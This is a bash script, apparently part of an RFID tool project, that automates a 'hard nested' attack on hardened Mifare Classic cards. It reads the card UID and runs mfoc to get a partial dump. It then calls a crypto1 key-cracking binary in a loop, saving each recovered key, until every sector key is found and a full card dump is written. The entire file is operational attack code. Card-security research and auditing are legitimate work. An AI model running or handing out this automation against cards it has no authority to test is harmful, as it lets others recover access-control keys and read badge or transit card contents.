#!/usr/bin/env bash

# Hard Nested Attack for hardened Mifare cards
# to run: bash hardnested.bash
#   intended to be run after install.bash

# Modified miLazyCracker script (commit 34c50ae) 
#   https://github.com/nfc-tools/miLazyCracker.git
#   Personalized to work with mcgui repo
#   Adds automation (miLazyCracker repeatedly cracks same sector key)
#       - creates and updates key file 
#       - continues to run until all keys found and card dump generated
#   Removes cloning capability (not normally needed when running script) 
#   Doesn't delete cracked card dump once script completes

# load environment variables
source ./config.bash

uid=$(nfc-list -t 1|sed -n 's/ //g;/UID/s/.*://p') # retrieves card uid
uidDir=$baseDir/cardDumps/$uid # directory to store card files
if [ ! -d $uidDir ]; then
  mkdir $uidDir
fi

keyFile=$uidDir/${uid}_keys.txt
dumpFile=$uidDir/${uid}_Dump.hex
partialDumpFile=$hnDir/.partialDump.txt

cracked=0;
while [ $cracked -eq 0 ]; do
    # run mfoc to generate $partialDumpFile
    #   has arguments needed for hard nested attack
    if [ -f "$keyFile" ]; then # if key file already exists
        mfoc -O $dumpFile -D $partialDumpFile -f $keyFile
    else
        mfoc -O $dumpFile -D $partialDumpFile
        touch $keyFile # create since does not exist
    fi

    if [ ! -s $partialDumpFile ]; then # if file empty, card cracked
        echo "Script Done"
        cracked=1;
    else 
        echo "Running hard nested attack" 
        # to run: ./libnfc_crypto1_crack <known key> <for block> <A|B> <target block> <A|B> <key file>
        
        # read necessary arguments from $partialDumpFile
        #   example $partialDumpFile: a5a4a3a2a1a0;0;A;15;B 
        while IFS=';' read -r knownKey forSector AB1 targetSector AB2; do :
        done < "$partialDumpFile"

        # known key reversed in partialDumpFile --> need to reverse back
  	# split key into bytes and reverse order
        key=($(echo $knownKey | fold -w2 | tac)) 
        knownKey=${key[0]}${key[1]}${key[2]}${key[3]}${key[4]}${key[5]}
        
        # convert sector numbers in $partialDumpFile to block numbers
        forBlock=$((forSector * 4))
        targetBlock=$((targetSector * 4))       

        # output hard nested print statements to terminal 
        # store last two output lines in key output variable
        #   if successful, third element will be recovered key
        #   otherwise, element = threads
        exec 5>&1
        hnCmd="$hn $knownKey $forBlock $AB1 $targetBlock $AB2 $keyFile"
        keyOutput=$($hnCmd | tee /dev/fd/5 | tail -2)   
        IFS=" " read -ra foundKeyArry <<< "$keyOutput"
        foundKey=${foundKeyArry[2]}
        if [ $foundKey == "threads" ]; then : # No solution found, try again
        else    
            echo $foundKey >> $keyFile # add $foundKey to $keyFile
        fi
    fi
done

rm $partialDumpFile
